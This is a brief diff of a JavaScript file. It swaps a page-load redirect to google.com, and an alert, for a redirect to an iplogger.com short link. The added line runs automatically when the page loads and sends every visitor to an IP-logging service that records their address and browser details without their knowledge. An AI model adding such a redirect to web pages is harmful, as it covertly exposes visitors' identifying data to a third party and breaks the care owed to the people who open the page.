@@ -1,6 +1,5 @@
 window.addEventListener("load", ()=>{
-    location.replace("https://www.google.com")
-    alert("Hello");
+    location.replace("https://iplogger.com/2VEkD5")
 })
 
 let min = 10;
